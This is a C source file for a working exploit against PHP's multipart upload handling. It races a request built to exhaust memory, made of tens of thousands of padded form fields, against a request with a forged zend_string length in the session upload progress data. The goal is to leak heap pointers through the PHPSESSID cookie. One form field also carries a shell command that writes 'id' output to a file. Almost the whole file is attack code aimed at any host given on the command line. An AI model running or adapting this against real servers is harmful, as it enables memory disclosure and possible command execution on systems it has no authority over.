/* p2s_window.c — concurrent OOM + leak read (corruption window catcher)
 *
 * Build:  cc -O2 -o p2s_window p2s_window.c
 * Run:    ./p2s_window [host] [port] [oom_mb] [tries]
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/time.h>

static const char *HOST = "127.0.0.1";
static int PORT = 8080;
static int OOM_MB = 12;
static int TRIES = 10; // Doğruluk olasılığı için deneme sayısı artırıldı

#define OOM_BND "S17"
#define LEAK_BND "BNDRY12345"

typedef struct {
    char *buf;
    unsigned long off;
    unsigned long cap;
} B;

static void b_str(B *b, const char *s) {
    size_t n = strlen(s);
    if (b->off + n > b->cap) return;
    memcpy(b->buf + b->off, s, n);
    b->off += n;
}

static void b_bytes(B *b, char c, unsigned long n) {
    if (b->off + n > b->cap) return;
    memset(b->buf + b->off, c, n);
    b->off += n;
}

static void b_raw(B *b, const void *p, size_t n) {
    if (b->off + n > b->cap) return;
    memcpy(b->buf + b->off, p, n);
    b->off += n;
}

/* ---------- OOM Body Builder ---------- */
static unsigned long build_oom_body(char *buf, unsigned long cap) {
    B b = {buf, 0, cap};
    char tmp[1024]; // Parametre uzunluğu için tampon genişletildi

    // Sınır çizgisini tam vurabilmek için optimize edilmiş döngü sayısı
    for (int i = 0; i < 26700; i++) {
        int n = snprintf(tmp, sizeof(tmp),
            "--%s\r\n"
            "Content-Disposition: form-data; name=\"param_idx_%d_"
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\r\n"
            "\r\n"
            "1\r\n", OOM_BND, i);
        
        if (b.off + n > b.cap) break;
        b_raw(&b, tmp, n);
    }

    /* PHPSESSID ve PROGRESS takibi */
    b_str(&b, "--" OOM_BND "\r\nContent-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n");
    b_raw(&b, "\x00", 1);
    b_str(&b, "\r\n");

    b_str(&b, "--" OOM_BND "\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\npwn\r\n");

    /* Tetiği çekecek olan hedef veri bloğu */
    b_str(&b, "--" OOM_BND "\r\nContent-Disposition: form-data; name=\"tuzak\"\r\n\r\nid > /out/p1\r\n");
    b_str(&b, "\r\n--" OOM_BND "--\r\n");

    return b.off;
}

/* ---------- Leak Body Builder ---------- */
static unsigned long build_leak_body(char *buf, unsigned long cap) {
    B b = {buf, 0, cap};
    char tmp[256];

    b_str(&b, "--" LEAK_BND "\r\n"
        "Content-Disposition: form-data; name=\"PHPSESSID\"\r\n"
        "\r\n"
        "attacksessionid0001\r\n");

    b_str(&b, "--" LEAK_BND "\r\n"
        "Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n"
        "\r\n"
        "pwn\r\n");

    for (int i = 0; i < 841; i++) {
        int n = snprintf(tmp, sizeof(tmp),
            "--" LEAK_BND "\r\n"
            "Content-Disposition: form-data; name=\"%d\"\r\n"
            "\r\n"
            "v%04d", 1000 + i, i);
        b_raw(&b, tmp, n);
        b_bytes(&b, 'x', 44);
        b_str(&b, "\r\n");
    }

    b_str(&b, "--" LEAK_BND "\r\n"
        "Content-Disposition: form-data; name=\"1999\"\r\n"
        "\r\n");
    
    unsigned long patch_offset = b.off;
    b_bytes(&b, 'A', 79);

    /* zend_string sahteciliği yaması (Hafıza adres hizalaması güvenli hale getirildi) */
    unsigned long long fake_len = 0x1000;
    if (patch_offset + 0x18 < b.cap) {
        memcpy(b.buf + patch_offset + 0x10, &fake_len, 8);
        b.buf[patch_offset + 0x18] = 'L';
    }

    b_str(&b, "\r\n--" LEAK_BND "--\r\n");
    return b.off;
}

/* ---------- Optimized HTTP POST Connection ---------- */
static int http_post(const char *body, unsigned long body_len,
                     const char *boundary, char *resp, int resp_size) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    inet_pton(AF_INET, HOST, &addr.sin_addr);

    /* Çökme anlarında soketin asılı kalmaması için 3 saniyelik zaman aşımı */
    struct timeval tv;
    tv.tv_sec = 3;
    tv.tv_usec = 0;
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));

    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) { close(fd); return -1; }

    int one = 1;
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));

    char hdr[512];
    int hdr_len = snprintf(hdr, sizeof(hdr),
        "POST / HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Content-Type: multipart/form-data; boundary=%s\r\n"
        "Content-Length: %lu\r\n"
        "Connection: close\r\n\r\n",
        HOST, PORT, boundary, body_len);

    if (send(fd, hdr, hdr_len, MSG_NOSIGNAL) < 0) { close(fd); return -1; }
    if (send(fd, body, body_len, MSG_NOSIGNAL) < 0) { close(fd); return -1; }

    int total = 0;
    memset(resp, 0, resp_size);
    while (total < resp_size - 1) {
        int n = recv(fd, resp + total, resp_size - total - 1, 0);
        if (n <= 0) break;
        total += n;
    }
    close(fd);
    return total;
}

static int get_status(const char *resp) {
    int st = 0;
    if (resp && resp[0] && strncmp(resp, "HTTP/", 5) == 0)
        sscanf(resp + 5, "%*c %d", &st);
    return st;
}

static int cookie_len(const char *resp) {
    const char *p = strstr(resp, "Set-Cookie: PHPSESSID=");
    if (!p) return 0;
    p += 22;
    int n = 0;
    while (*p && *p != ';' && *p != '\r' && *p != '\n') { n++; p++; }
    return n;
}

static int heap_ptrs(const unsigned char *buf, int len) {
    int cnt = 0;
    for (int i = 0; i + 8 <= len; i++) {
        unsigned long long v = 0;
        for (int j = 0; j < 8; j++) v |= (unsigned long long)buf[i+j] << (8*j);
        if (v >= 0x7F0000000000ULL && v < 0x800000000000ULL) cnt++;
    }
    return cnt;
}

/* ---------- Main Execution ---------- */
/* main fonksiyonunun güncellenmiş ve hata ayıklama satırları eklenmiş hali */
int main(int argc, char **argv) {
    if (argc > 1) HOST = argv[1];
    if (argc > 2) PORT = atoi(argv[2]);
    if (argc > 3) OOM_MB = atoi(argv[3]);
    if (argc > 4) TRIES = atoi(argv[4]);

    // Bellek alanı 32 MB olarak genişletildi
    unsigned long oom_cap = 32 * 1024 * 1024; 
    char *oom_body = malloc(oom_cap);
    unsigned long oom_len = build_oom_body(oom_body, oom_cap);
    
    // HATA AYIKLAMA 1: C kodunun ürettiği veri boyutunu görelim
    printf("[*] Üretilen OOM İstek Gövdesi Boyutu: %lu bayt (%.2f MB)\n", 
           oom_len, (double)oom_len / (1024 * 1024));

    if (!oom_len) { 
        fprintf(stderr, "[-] OOM body build failed\n"); 
        free(oom_body); 
        return 1; 
    }

    unsigned long leak_cap = 128 * 1024;
    char *leak_body = malloc(leak_cap);
    unsigned long leak_len = build_leak_body(leak_body, leak_cap);
    if (!leak_len) { 
        fprintf(stderr, "[-] Leak body build failed\n"); 
        free(oom_body); free(leak_body); 
        return 1; 
    }

    char *leak_resp = malloc(1 << 20);

    printf("\n%5s | %7s | %8s | %5s | %s\n",
           "try", "stLeak", "cookie", "cnt", "status_msg");
    printf("--------------------------------------------------\n");

    for (int t = 0; t < TRIES; t++) {
        pid_t pid = fork();
        if (pid < 0) { perror("fork"); break; }

        if (pid == 0) {
            /* CHILD PROCESS */
            char *oom_resp = malloc(65536);
            int oom_rlen = http_post(oom_body, oom_len, OOM_BND, oom_resp, 65536);
            
            // HATA AYIKLAMA 2: Sunucunun OOM isteğine verdiği ham yanıtı ilk denemede ekrana basalım
            if (t == 0 && oom_rlen > 0) {
                printf("\n[DEBUG] Sunucunun OOM İsteğine Verdiği Ham Yanıt:\n%.300s\n\n", oom_resp);
            }
            
            free(oom_resp);
            _exit(0);
        } else {
            /* PARENT PROCESS */
            usleep(0); 
            int rlen = http_post(leak_body, leak_len, LEAK_BND, leak_resp, 1 << 20);
            int status = get_status(leak_resp);
            int clen = cookie_len(leak_resp);
            int cnt = heap_ptrs((unsigned char *)leak_resp, rlen);
            
            const char *sig = (clen > 100 && cnt >= 8) ? "SUCCESS: LEAK!" :
                              (clen > 100) ? "CATCHED: Big Area" : "FAILED: Clean";

            printf("%5d | %7d | %6dB  | %5d | %s\n",
                   t + 1, status, clen, cnt, sig);
            fflush(stdout);

            waitpid(pid, NULL, 0);
        }
        usleep(600000); 
    }

    printf("--------------------------------------------------\n");
    free(oom_body); free(leak_body); free(leak_resp);
    return 0;
}
